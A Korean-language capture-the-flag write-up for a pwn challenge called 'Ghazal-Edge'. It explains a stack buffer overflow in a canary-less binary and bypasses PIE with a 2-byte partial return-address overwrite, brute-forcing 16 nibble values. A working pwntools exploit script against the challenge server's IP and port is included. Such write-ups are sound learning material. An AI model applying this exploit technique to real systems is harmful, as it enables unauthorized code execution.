# 문제명
Ghazal-Edge

## 문제 설명

-서버에 접속하면 Welcome 메시지와 Input 프롬프트가 출력된다. 바이너리(no_eyes)와 libc, ld가 함께 제공되고 입력값을 받아 처리하는 단순한 구조다.

## 풀이

### 분석

-바이너리를 확인하면 PIE와 NX는 활성화되어 있지만 스택 카나리는 비활성화되어 있다. objdump로 디스어셈블하면 주요 함수가 두 개 보인다. 하나는 vuln()으로, 32바이트짜리 버퍼에 read()로 256바이트를 읽어들인다. 다른 하나는 win()으로, execve("/bin/sh", NULL, NULL)을 호출해 셸을 직접 띄워준다. 즉 셸을 실행하는 함수가 바이너리 안에 이미 존재한다.

### 취약점

-vuln() 함수에서 버퍼는 32바이트인데 read()가 256바이트를 읽으므로 스택 버퍼 오버플로우가 발생한다. 카나리가 없기 때문에 32바이트 버퍼와 8바이트 saved rbp를 합친 40바이트를 채우면 return address를 그대로 덮을 수 있다.

### 익스플로잇

-PIE가 활성화되어 있어 win()의 절대 주소를 알 수 없다. 하지만 PIE base는 항상 페이지 정렬이 되어 있어 하위 12비트가 0x000으로 고정되고 win()의 하위 12비트도 0x22a로 고정된다. 따라서 return address의 하위 2바이트만 덮으면 상위 주소는 그대로 유지된다. win()의 실제 lower 2바이트는 PIE nibble에 따라 0x022a부터 0xf22a까지 16가지가 될 수 있으므로 이를 순서대로 브루트포스하면 평균 8번 만에 맞출 수 있다.

```python
from pwn import *

HOST = '34.62.69.250'
PORT = 41051
RET_OFFSET = 40

for nibble in range(16):
    win_addr = (nibble << 12) | 0x22a
    try:
        p = remote(HOST, PORT)
        p.recvuntil(b'Input: ', timeout=5)
        p.send(b'A' * RET_OFFSET + p16(win_addr))
        out = p.recv(timeout=2)
        if b'found' in out:
            p.sendline(b'cat flag.txt')
            print(p.recvall(timeout=3).decode())
            exit(0)
        p.close()
    except:
        try: p.close()
        except: pass
```

## 배운 점
-우선 많은 개념에 대해서 제대로 상기하고 특히 카나리 유무를 먼저 확인하는 습관이 중요하다는 걸 배웠다. 카나리가 없으면 BOF가 바로 터지기 때문에 보호 기법 체크가 분석의 첫 단계가 되어야 한다. 또한 PIE가 있다고 해서 무조건 주소 릭이 필요한 건 아니었다. 하위 바이트만 덮는 partial overwrite로 brute force가 가능하고, nibble이 4비트라 최대 16번이면 충분하다는 점도 새로 알게 됐다. 마지막으로 바이너리 안에 win function이 있는지 항상 먼저 확인해야 한다는 것도 깨달았다. libc leak 없이도 풀리는 문제가 있기 때문에 strings나 objdump로 먼저 바이너리 구조를 파악하는 게 훨씬 효율적이다.
